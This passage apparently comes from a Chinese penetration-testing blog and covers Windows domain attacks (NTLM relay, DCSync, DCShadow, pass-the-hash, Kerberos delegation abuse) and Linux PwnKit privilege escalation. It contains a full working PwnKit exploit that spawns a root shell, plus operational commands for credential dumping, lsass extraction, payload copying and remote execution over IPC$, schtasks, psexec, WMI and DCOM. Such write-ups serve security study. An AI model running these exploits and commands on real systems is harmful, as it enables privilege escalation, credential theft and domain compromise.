CVE-2015-005\n域控制器没有验证正在发送NETLOGON消息的机器是否是真正的域内的应用服务器。这意味着任何加入域的机器都可以向域控制器传递身份验证，并获取域内任何会话的 Session Key。\n 后来微软修复了该 BUG：域控制器将验证 AUTHENTICATE 响应中的目标计算机与发出 NetLogon 请求的主机是否相同。\nCVE-2015-0005 影响范围： Windows Server 2012 及以下，对个人 PC 无影响。\n原理 应用服务器在收到用户客户端的认证信息后，由于本身没有存储用户的口令信息，所以必须依赖域服务器进行认证，将收到的认证信息发送给域服务器，这个过程基于 NETLOGON 协议。该协议在应用服务器和域服务器之间建立一个安全会话，安全会话共享密钥基于应用服务器主机账号的口令 NTLM 生成。\n通过该协议的通信，除了进行基本的认证，最终还依靠 DC 生成用于客户端和应用服务器之间用来签名、加密的Session Key。\n域控制器没有验证正在发送NETLOGON消息的机器是否是真正的域内的应用服务器。这意味着任何加入域的机器都可以向域控制器传递身份验证，并获取域内任何会话的 Session Key。\n攻击 impacket 工具包中的 smbrelayx 可进行中间人攻击，如果目标机器强制使用 SMB 签名，该工具可尝试 NETLOGON 直接向域控读取Session Key。\n 如果是非域内主机，只需要提供域内任意一台机器的机器账号和对应 NTLM，用以发起 NETLOGON 会话。\n python smbrelayx.py -h 目标主机IP -machine-account 域内某台主机的机器账号 -machine-hashes 对应NTLM -domain 域控IP\r-e:指定目标机器要执行的文件，默认 dump 目标机器上的 Hash\r-c:指定要执行的命令\r防御 微软发布了补丁 MS15-027，对 ComputerName 和 NetBIOS 这 2 个字段进行了校验，并且对这个消息认证块进行了签名校验。\n","date":"2022-02-01T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-16/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-16/","title":"NTLM Relay"},{"content":"pkexec 本地提权 CVE-2021-4034\n简介 Polkit是一个用于控制类Unix系统中控制系统范围权限的组件，它为非特权进程与特权进程的通信提供了一种有组织的方式。\npkexec是Polkit开源应用框架的一部分，它负责协商特权进程和非特权进程之间的互动，允许授权用户以另一个用户的身份执行命令，和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。\n pkexec是一个suid文件：\n\r\n  pkexec执行whoami：  \r\n 输入root认证密码后：  \r\n漏洞信息 当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。\n影响范围：\n影响2009年 - 今的版本(当前0.105)\n复现环境 \r\n漏洞原理 int\rmain (int argc, char *argv[])\r{\r··· ···\r··· ···\r// 从1开始\rfor (n = 1; n \u0026lt; (guint) argc; n++) {\rif (strcmp (argv[n], \u0026quot;--help\u0026quot;) == 0)\r{\ropt_show_help = TRUE;\r}\relse\r{\rbreak;\r}\r}\r··· ···\rg_assert (argv[argc] == NULL);\rpath = g_strdup (argv[n]); //获取要执行的命令\rif (path == NULL)\r{\r···\r}\rif (path[0] != '/')\r{\r// 该函数根据PATH环境变量寻找要执行命令的绝对路径\rs = g_find_program_in_path (path); if (s == NULL)\r{\r···\r}\rg_free (path);\rargv[n] = path = s;//获取到地址后，修改命令行参数\r}\r··· ···\r··· ···\r大致是这样的流程：\n 从1开始获取参数值，表明默认在pkexec后会跟着一个要执行的命令，例如pkexec whoami 匹配到命令后传入g_find_program_in_path函数，该函数负责根据PATH环境变量寻找要执行命令的绝对路径，例如/usr/bin/whoami 最后写回命令行参数，就可以执行  Linux二进制程序运行时会将命令行参数argv[]和环境变量environ[]放到栈底部，并且argv[] 和 environ[] 是连续的。\n当以命令行启动pkexec，arg[0]=\u0026lsquo;pkexec\u0026rsquo;，arg[1]='\\x00'，运行正常。但是当以execve函数启动的pkexec ，不带任何其他参数，那么argv[0] 为''\\x00'，argv[1] 环境变量就会越界到 environ[0]。\n那么利用思路就是以execve函数启动pkexec，且不带参数，并伪造环境变量。\n漏洞利用 POC中最终寻找到的是GCONV_PATH环境变量，利用其完成恶意so文件加载并执行恶意代码。\nexp：\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; char *shell = \u0026#34;#include \u0026lt;stdio.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;stdlib.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;unistd.h\u0026gt;\\n\\n\u0026#34; \u0026#34;void gconv() {}\\n\u0026#34; \u0026#34;void gconv_init() {\\n\u0026#34; \u0026#34; setuid(0); setgid(0);\\n\u0026#34; \u0026#34; seteuid(0); setegid(0);\\n\u0026#34; \u0026#34; system(\\\u0026#34;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf \u0026#39;GCONV_PATH=.\u0026#39; \u0026#39;pwnkit\u0026#39;; /bin/sh\\\u0026#34;);\\n\u0026#34; \u0026#34; exit(0);\\n\u0026#34; \u0026#34;}\u0026#34;; int main(int argc, char *argv[]) { FILE *fp; system(\u0026#34;mkdir -p \u0026#39;GCONV_PATH=.\u0026#39;; touch \u0026#39;GCONV_PATH=./pwnkit\u0026#39;; chmod a+x \u0026#39;GCONV_PATH=./pwnkit\u0026#39;\u0026#34;); system(\u0026#34;mkdir -p pwnkit; echo \u0026#39;module UTF-8// PWNKIT// pwnkit 2\u0026#39; \u0026gt; pwnkit/gconv-modules\u0026#34;); fp = fopen(\u0026#34;pwnkit/pwnkit.c\u0026#34;, \u0026#34;w\u0026#34;); fprintf(fp, \u0026#34;%s\u0026#34;, shell); fclose(fp); system(\u0026#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC\u0026#34;); char *env[] = { \u0026#34;pwnkit\u0026#34;, \u0026#34;PATH=GCONV_PATH=.\u0026#34;, \u0026#34;CHARSET=PWNKIT\u0026#34;, \u0026#34;SHELL=pwnkit\u0026#34;, NULL }; execve(\u0026#34;/usr/bin/pkexec\u0026#34;, (char*[]){NULL}, env); } \r\n","date":"2022-01-01T00:00:00Z","image":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/","title":"pkexec 本地提权"},{"content":"DCShadow 攻击 背景 2018 年 1 月 24 日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 DCShadow。在具备域管理员权限条件下，攻击者可以创建伪造的域控制器，将预先设定的对象或对象属性复制到正在运行域服务器中。\n**DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。**Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。\n从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 DCShadow 的基础，应该会有很多新的攻击方法。\n流程 DCShadow 的攻击过程包括 3 个主要个步骤:\n 在目标域的 AD 活动目录注册一个伪造的 DC 使伪造的 DC 被其他的 DC 认可，能够参与域复制 强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中  注册伪造 DC 一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 NTDS-DSA(nTDSDSA)类对象。注册的位置为 CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com。\n\r\nadsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01。测试机器为 Win7X86cn04，如果 DCShadow 测试成功的话，则会生成一个新的NTDS-DSA(nTDSDSA)类对象：\n\r\n 查看 CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com的安全描述符，可知必须有域管理员权限才具备写权限。\n\r\n所以发动 DCShadow 攻击首先必须具备域管理员权限。\n 认可 DC 一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:\n 这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 WIN7X86CN04$ 伪造 DC 能认证其他 DC 来访问的账号，通过给 WIN7X86CN04$ 添加 SPN，可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:DRS服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 GC(Global Catalog)服务  \r\n 运行 DRS 服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口  发起复制 通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用·DRSReplicaAdd 函数强制立即发起域复制。\n","date":"2021-12-15T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-11/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-11/","title":"DCShadow 攻击"},{"content":"DCSync 攻击 背景 2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。\nDCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。而DCSync 的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。\n 注意：\nDCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC 不能参与复制同步数据。\n 原理 本质就是利用 DC 间的数据同步复制。\n 发现网络中的目标域控制器 通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol   Samba wiki 关于 GetNCChanges 的描述包括：\n当一个 DC (成为客户端 DC)想从其他 DC (成为服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。\n如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。\n 条件 某用户想要发起 DCSync 攻击，必须具备以下权限：\n Replicating Directory Changes (DS-Replication-Get-Changes) Replicating Directory Changes All (DS-Replication-Get-Changes-All) Replicating Directory Changes In Filtered Set  \r\n\r\n 在默认情况下，只有 Administrators、Domain Controllers 和 Enterprise Domain Admins 组内的用户有权限使用 DCSync，但我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync 功能。\n 攻击 # 导出指定用户\rlsadump::dcsync /domain:rd.adsecurity.org /user:administrator # 导出域内所有用户\rlsadump::dcsync /domain:rd.adsecurity.org /all\r\r\n防御 最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步。\n获取域内所有 IP 的脚本：\nPowerShell:Get-ADDomainController -filter * | select IPv4Address\r[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress\r","date":"2021-12-15T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-10/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-10/","title":"DCSync 攻击"},{"content":"Windows 认证 Windows 认证方式主要有两种：NTLM 认证、kerberos 认证。同时，Windows Access Token 记录着用户的SID、组ID、Session、及权限等信息，也起到了权限认证的作用。\n其中 NTLM 认证主要有本地认证和网络认证两种方式。\n本地认证 NTLM NTLM Hash 是支持 Net NTLM 认证协议及本地认证过程中的一个重要参与物，其长度为 32 位，由数字与字母组成。 Windows 本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在 SAM 数据库中。 当用户登录时,将用户输入的明文密码也加密成 NTLM Hash,与 SAM 数据库中的 NTLM Hash 进行比较。NTLM Hash 的前身是 LM Hash，目前基本淘汰，但是还是存在。\nSAM 文件一般在%SystemRoot%\\system32\\config\\sam：\n\r\nNTLM hash 的产生：\nadmin -\u0026gt; hex(16进制编码) = 61646d696e\r61646d696e -\u0026gt; Unicode = 610064006d0069006e00\r610064006d0069006e00 -\u0026gt; MD4 = 209c6174da490caeb422f3fa5a7ae634\r流程  Windows Logon Process，即 winlogon.exe， 是 Windows NT 用户登陆程序，用于管理用户登录和退出。 LSASS 是微软 Windows 系统的安全机制。用于本地安全和登录策略。  winlogon.exe -\u0026gt; 接收用户输入的账密 -\u0026gt; lsass.exe -\u0026gt; 转换NTLM hash 并与 SAM 文件中的进行对比 -\u0026gt; 相同则将user SID 和 group SID 发给 winlogon.exe，准备桌面，登录成功\r网络认证 内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式，没有信托机构。\n网络认证则是基于一种 Challenge/Response 认证机制(NTLM 协议)的认证模式。例如 SMB 文件共享。\n流程  协商：主要用于确认双方协议版本、加密等级等。 质询  客户端向服务器端发送用户信息(用户名)。 服务器收到请求，生成 16 位随机数，称之为\u0026quot;Challenge\u0026quot;，随后使用登录用户名对应的 NTLM hash 加密 Challenge，得到 Challenge1。将 Challenge 发送给客户端。 客户端得到 Challenge 后，使用登录账户的 NTLM hash 加密 Challenge 得到 Response，随后将Response 发送给服务端。   验证：服务端校验收到的 Response 是否与 Chanllenge1 相等，相等则认证通过。  \r\nNTLM v1 和 v2 区别   NTLM v1 的 Challenge 有 8 位，NTLM v2 的 Challenge 为 16 位\n  NTLM v1 的主要加密算法是 DES，NTLM v2 的主要加密算法是 HMAC-MD5(实际实现下，可能使用更好的算法)。\n  Windows Access Token 简介 Windows Token，也叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个 Token 在用户创建进程或者线程时会被使用，并不断拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。\n种类  Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录) Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)  一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的 Access Token。\n当用户注销，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。\nAccess Token 的组成：\n 用户帐户的安全标识符(SID) 用户所属的组的SID 用于标识当前登录会话的登录SID 用户或用户组所拥有的权限列表 所有者SID 主要组的SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制SID的可选列表 目前的模拟等级 其他统计数据  产生 每个进程创建时都会根据登录会话权限由 LSA(Local Security Authority)分配一个 Token，如果CreaetProcess时自己指定了 Token, LSA 会使用该 Token， 否则就使用父进程 Token 的一份拷贝。\n令牌假冒 本质就是利用：用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除。\n Cobalt Strike  steal_token\r MSF  meterpreter \u0026gt; getsystem\rmeterpreter \u0026gt; load incognito meterpreter \u0026gt; list_tokens –u\rmeterpreter \u0026gt; impersonate_token \u0026quot;PAYLOADS\\\\Administrator”\r","date":"2021-12-15T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-12/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-12/","title":"Windows 认证"},{"content":"内网横向 Windows 密码与 Hash 抓取 mimikatz 直接读取明文密码 privilege::debug\rsekurlsa::logonpasswords\r通过SAM 和 SYSTEM 文件抓取密码  导出SAM 和 SYSTEM文件  reg save hklm\\sam sam.hive\rreg save hklm\\system system.hive\r mimikatz 离线读取文件获得 NTLM  lsadump::sam /sam:sam.hive system:system.hive\r 在目标机器上直接读取本地SAM文件  privilege::debug\rtoken::elevate\rlsadump::sam\rmimikatz 离线读取 lass.dmp 文件  使用Procdump(微软工具，免杀)工具导出 lass.dmp  Procdump.exe -accepteula -ma lsass.exe lsass.dmp\r 使用 mimikatz 导出 lsass.dmp 文件中的密码值  sekurlsa::mimidump lsass.dmp\rsekurlsa::logonpasswords full\rWindows 远程连接 IPC IPC$(Internet Process Connection) 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。\n建立 ipc$ 连接的条件：\n 目标主机开启了139和445端口 目标主机管理员开启了ipc$默认共享  # 通过账户:口令建立IPC\rnet use \\\\IP\\ipc$ \u0026quot;password\u0026quot; /user:\u0026quot;username\u0026quot;\r# 查看当前主机所建立的IPC\rnet use\r建立IPC后，可以使用如下命令进行一些基本操作：\n dir 命令  # 列出目标主机上的C盘\rdir \\\\IP\\c$\r copy  # 复制恶意文件到目标C盘\rcopy C:\\Users\\douser\\Desktop\\shell.exe \\\\IP\\c$\r计划任务横向 at 命令  用于 Windows server 2008 之前版本\n  建立IPC 查看目标当前时间  net time \\\\IP\r 复制马到目标主机  copy payload.bat \\\\IP\\C$  创建计划任务  at \\\\IP 7:00AM C:\\payload.bat\r# 执行完毕返回任务ID\r 上线之后，删除计划任务  at \\\\IP taskid /delete\rschtakss 命令  schtasks命令比at命令更为灵活、自由，用以代替at。\n  建立IPC 复制马到目标主机 创建名为test的计划任务  schtask /create /s IP /tn test /sc minute /tr c:\\payload.bat /ru system /f\r# minute表明每分钟执行一次\r# 创建失败，比如拒绝访问错误，就是权限不够，可以使用/u /p 参数附带高权限用户\r 等计划任务运行，上线 也可以让其直接运行  schtasks /run /s ip /i /tn test\r# 权限不够，附加用户和密码\r 上线后，删除计划任务  schtasks /delete /s ip /tn \u0026quot;test\u0026quot; /f\r 在使用schtasks命令时，会在系统中留下日志文件：C:\\Windows\\Tasks\\SchedLgU.txt\n PTH 攻击 NTLM Hash 传递 mimikatz \u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]\u0026quot;\rAES-256 密钥进行哈希传递  使用 mimikatz 抓取 AES-256 密钥  mimikatz \u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::ekeys\u0026quot;\r pth攻击（目标机器安装 KB2871997）  mimikatz \u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]\u0026quot;\r票据传递  基于ms14-068生成TGT 使用mimikatz将票据注入内存  kerberos::purge kerberos::list kerberos::ptt C:\\xxx.kirbi  访问域内其他主机  psexec psexec 是 windows 下非常好的一款远程命令行工具。属于微软官方，所以一般是免杀的。\n原理  通过ipc$连接，释放二进制文件psexecsvc.exe到目标 通过服务管理SCManager远程创建一个psexec服务，并启动服务 客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据 运行结束后删除服务  条件  对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名 对方未开启防火墙 如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问 如果是域环境，连接普通域主机可以用普通域用户，连接域控只能用域管理员账户  使用  建立IPC 获取 System 权限的 交互式shell  PsExec.exe -accepteula \\\\IP -s cmd.exe\r# 直接执行命令\rPsExec.exe -accepteula \\\\IP -s cmd.exe /c ipconfig\r# 缺少-s将返回Administrator 权限的 shell\rMSF exploit/windows/smb/psexec\rexploit/windows/smb/psexec_psh（powershell 版本）\r永恒之蓝 auxiliary/scanner/smb/smb_ms17_010\rauxiliary/admin/smb/ms17_010_command\rexploit/windows/smb/ms17_010_eternalblue\rWMI 基本使用 wmic /node:IP /user:administrator /password:passed process call create \u0026quot;cmd.exe /c ipconfig \u0026gt; ip.txt\u0026quot;\r 建立IPC，使用type命令读取结果  type \\\\IP\\C$\\ip.txt\rimpacket 包中的 wmiexec python wmiexec.py administrator:password@IP\r# 如果没有密码，也可以配合哈希传递\rwmiexec.py -hashes\rsmbexec impacket 版 python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7\rLinux 跨平台 Windows 远程命令执行 https://github.com/brav0hax/smbexec\nDCOM DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。\n本地执行任意命令  获取 DCOM 程序列表  # windows server 2012 及以上\rGet-CimInstance Win32_DCOMApplicatioon\r# Windows 7、Windows Server 2008\rGet-WmicObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication\r 执行任意命令  # 本地管理员powershell下执行\r[System.Activator]::CreateInstance([type]::GetTypeFromProgID(\u0026quot;MMC20.Application\u0026quot;,\u0026quot;127.0.0.1\u0026quot;)).Document.ActiveView.ExecuteShellCommand(\u0026quot;cmd.exe\u0026quot;,\u0026quot;0\u0026quot;,\u0026quot;/c calc.exe\u0026quot;,\u0026quot;Minimzed\u0026quot;)\r远程主机上执行命令  IPC连接  net use \\\\IP \u0026quot;password\u0026quot; /user:pentest.hacker\\win7user\r 执行命令  # 调用 MMC20_Application 远程执行命令\r$com=[Activator]::CreateInstance([type]::GetTypeFromProgID(\u0026quot;MMC20.Application\u0026quot;,\u0026quot;IP\u0026quot;))\r$com.Document.ActiveView.ExecuteShellCommand(\u0026quot;cmd.exe\u0026quot;,\u0026quot;0\u0026quot;,\u0026quot;/c calc.exe\u0026quot;,\u0026quot;Minimzed\u0026quot;)\r# 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39\r$com=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\u0026quot;IP\u0026quot;)\r$obj=[System.Activator]::CreateInstance($com)\r$item=$obj.item()\r$item.Document.Application.ShellExecute(\u0026quot;cmd.exe\u0026quot;,\u0026quot;/c calc.exe\u0026quot;,\u0026quot;c:\\windows\\system32\u0026quot;,\u0026quot;$null\u0026quot;,0)\r","date":"2021-12-15T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-15/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-15/","title":"内网横向"},{"content":"基于域委派的攻击 定义 委派 Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate\rThis delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request\rMany real-world scenarios exist in which a Web application “front end” must retrieve data from a more secure “back end”, such as a Web service that is connected to a Microsoft SQL Server database.\r域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。\n域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。\n服务账号(Service Account)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。\n多跳认证和委派的流程 多跳认证示意图：\n\r\n流程：\n 域内用户 jack 以 Kerberos 方式认证后(先向 DS 进行常规的 kerberos 认证，获取 Web 服务器的访问权限)访问 Web 服务器 Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请 KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 TGS KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 TGS websvc 收到的 jack 用户的授权票据 TGS 后，可访问文件服务，完成多跳认证。  委派分类  非约束委派(Unconstrained Delegation)  服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务。\n 约束性委派(Constrained Delegation)  Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS，从而只能模拟用户访问特定的服务。\n\r\n非约束委派 原理 \r\n当 user 访问 service1 时，如果 service1 的服务账号开启了 unconstrained delegation（非约束委派），则当 user 访问 service1 时会将 user 的 TGT 发送给 service1 并保存在内存中以备下次重用，然后 service1 就可以利用这张TGT 以 user的身份去访问域内的任何服务（任何服务是指user能访问的服务）。\n流程如下：\n 用户向KDC请求可转发TGT，记为TGT1 KDC返回TGT1 用户通过TGT1向KDC请求转发TGT2 KDC返回TGT2 用户通过TGT1向KDC申请访问服务1的TGS KDC返回TGS 用户发送TGS、TGT1、TGT2和TGT2的SessionKey给服务1 服务1通过用户的TGT2请求KDC，以用户名义请求服务2的TGS（服务访问票据） KDC给服务1返回服务2的TGS 服务1以用户名义向服务2发出请求 服务2响应服务1的请求 服务1响应用户第7步骤的请求   其中TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。\n本质：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。\n 查找委派账号，开启委派后，在该用户的 userAccountControl 属性中会包含TRUSTED_FOR_DELEGATION：\n\r\n实战 非约束委派查找  adfind  基于LDAP服务。\n查询非约束委派的主机：\nAdFind.exe -b \u0026quot;DC=pentest,DC=com\u0026quot; -f \u0026quot;(\u0026amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\u0026quot; cn distinguishedName\r\r\n查询非约束委派的用户：\nAdFind.exe -b \u0026quot;DC=pentest,DC=com\u0026quot; -f \u0026quot;(\u0026amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\u0026quot; cn distinguishedName\r powerview  查询配置非约束委派的用户：\nGet-NetUser -Unconstrained -Domain pentest.com\r查询配置非约束委派的主机：\nGet-domaincomputer -Unconstrained -Domain pentest.com\r\r\nPowerShell脚本枚举域内所有的服务账号，查看哪些账号被设置委派，以及何种类型的委派：\nGet-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | f1\r当一个用户具备对某个服务账号的SeEnableDelegationPrivilege权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用SeEnableDelegationPrivilege属性，制作极其隐蔽的后门。\n利用-管理员模拟访问 当域管理员访问目标服务账号，且该服务账号配置了非约束性委派，那么域管理员会将自己的TGT发送给该服务，并保留在机器内存中，因此攻击者可提取这台机器上缓存的TGT，从而获得域管权限，随后进行PTT攻击即可。\n 模拟管理员调用非约束性委派机的 smb 服务：net use \\\\win7\\c$ 在非约束性委派机上查看票据  privilege::debug\rsekualsa::tickets\r\r\n 导出票据  sekurlas::tickets /export\r\r\n 当前状况下访问域控会被拒绝  \r\n mimikatz 将票据注入内存  kerberos::ptt 票据文件名\r\r\n利用-Spooler Printer Bug 实际情况下，管理员不一定会访问非约束委派服务，留下TGT。可利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。\n原理：\n利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。\n 注意：\n这种攻击需要找到一台开启非受限委派的主机账户，而非服务账户\n POC：\nhttps://github.com/leechristensen/SpoolSample\n 用 Rubeus 来监听 Event ID 为 4624 事件，即监听登录会话提取TGT  Rubeus.exe monitor /interval:1 /filteruser:DC$\r Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，Rubeus可以直接将 base64 编码的票据直接注入到内存中。\n  向 DC 的 Spooler 服务发送请求，强制其访问 win7 进行身份验证  SpoolSample.exe DC win7\r 随后进行票据导出和注入 用 dcsync 导出域控中所有用户的 hash，然后用 krbtgt 用户的 hash 生成黄金票据  lsadump::dcsync /domain:test.local /all /csv\r约束性委派 原理 由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 S4U (S4U2Self / S4U2proxy)。\n S4U2self (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个服务账户的 userAccountControl 标志为 TRUSTED_TO_AUTH_FOR_DELEGATION, 则其可以代表任何其他用户获取自身服务的 TGS/ST。 S4U2proxy(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以代表任何用户获取在 msDS-AllowedToDelegateTo 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。  约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。\n\r\nS4U2self：\n 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。 KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。 service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。  尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 